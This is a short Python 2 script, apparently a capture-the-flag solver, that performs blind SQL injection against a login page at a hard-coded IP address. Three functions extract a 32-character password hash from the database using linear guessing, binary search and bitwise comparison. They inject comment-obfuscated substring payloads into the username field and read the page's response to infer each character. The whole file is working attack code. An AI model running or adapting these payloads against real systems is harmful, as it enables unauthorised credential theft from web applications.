# -*- coding: utf-8 -*-
import requests

def method1():
    url = "http://101.200.145.44/web6/auth.php"
    strBox = '0123456789abcdef'
    password = []
    for index in range (1,33):
        print index,
        for i in strBox:
            username = "admin'/**/and/**/substring(password,"+str(index)+",1)='"+i
            data = {'username':username,'password':'admin'}
            r = requests.post(url,data=data)
            if r.text.find(u'ï»¿å¯ç éè') != -1:
                print i
                password.append(i)
                break
    print ''.join(password)

def method2():
    url = "http://101.200.145.44/web6/auth.php"
    strBox = "'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'"
    password = []
    for index in range (1,33):
        print index,':',
        startPos = 0
        endPos = len(strBox)//2
        while endPos - startPos >= 3 :
            username = "admin'/**/and/**/substring(password,"+str(index)+",1)/**/in/**/("+strBox[startPos:endPos]+");'"
            data = {'username':username,'password':'admin'}
            r = requests.post(url,data=data)
            if r.text.find(u'ï»¿å¯ç éè') != -1:
                endPos = startPos + (endPos-startPos)//2
            else:
                tmp = endPos - startPos
                startPos = endPos + 1
                endPos = startPos + tmp

        print strBox[startPos+1]
        password.append(strBox[startPos+1])

    print ''.join(password)
    

def method3():
    url = "http://101.200.145.44/web6/auth.php"
##    strBox = "'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'"
    password = []
    for index in range (1,33):
        print index,':',
        bit = []
        
        for i in range(8):
            username = "admin'/**/and/**/ascii(substring(password,"+str(index)+",1))/**/&/**/("+str(pow(2,7-i))+");'"
            data = {'username':username,'password':'admin'}
            r = requests.post(url,data=data)
            if r.text.find(u'ï»¿å¯ç éè') != -1:
                bit.append('1')
            else:
                bit.append('0')

        ch = chr(int(''.join(bit),2))
        print ch
        password.append(ch)
        
    print ''.join(password)


if __name__ == '__main__':
    import time
    time1_1 = time.time()
    method1()
    time1_2 = time.time()
    print time1_2-time1_1
    time2_1 = time.time()
    method2()
    time2_2 = time.time()
    print time2_2-time2_1
    time3_1 = time.time()
    method3()
    time3_2 = time.time()
    print time3_2-time3_1
